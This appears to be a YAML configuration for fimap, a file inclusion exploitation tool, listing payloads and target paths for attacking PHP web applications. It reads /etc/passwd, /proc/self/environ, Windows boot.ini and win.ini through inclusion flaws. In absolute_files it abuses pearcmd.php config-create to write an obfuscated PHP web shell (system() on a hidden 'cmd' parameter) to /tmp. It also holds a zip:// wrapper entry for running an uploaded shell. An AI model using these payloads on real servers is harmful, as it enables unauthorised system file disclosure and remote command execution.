# fimap generic.yaml — ported from src/config/generic.xml revision 3
# Basic scan parameters: relative/absolute/log/blind files, shell commands.

relative_files:
  - path: /etc/passwd
    find: "root:"
    flags: r
    unix: true
    windows: false
  - path: "c:\\boot.ini"
    find: "[operating"
    flags: r
    unix: false
    windows: true
  - path: /proc/self/environ
    find: "HTTP_USER_AGENT="
    flags: rxA
    unix: true
    windows: false
  - path: "c:\\windows\\win.ini"
    find: "[fonts"
    flags: r
    unix: false
    windows: true
  - path: /proc/self/fd/0
    find: ""
    flags: r
    unix: true
    windows: false
  - path: /proc/self/fd/1
    find: ""
    flags: r
    unix: true
    windows: false
  - path: /proc/self/fd/2
    find: ""
    flags: r
    unix: true
    windows: false
  - path: /proc/self/status
    find: "Name:"
    flags: r
    unix: true
    windows: false
  - path: /proc/self/cmdline
    find: ""
    flags: r
    unix: true
    windows: false

absolute_files:
  - path: /usr/local/lib/php/pearcmd.php
    post: "+config-create+/<?=system($_GET[chr(99).chr(109).chr(100)])?>+/tmp/fimap_shell.php"
    find: ""
    flags: rxP
    unix: true
    windows: false
  - path: /usr/local/share/pear/pearcmd.php
    post: "+config-create+/<?=system($_GET[chr(99).chr(109).chr(100)])?>+/tmp/fimap_shell.php"
    find: ""
    flags: rxP
    unix: true
    windows: false

remote_files:
  - path: "zip://path/to/uploaded.zip%23shell.php"
    find: ""
    flags: rR
    unix: true
    windows: true

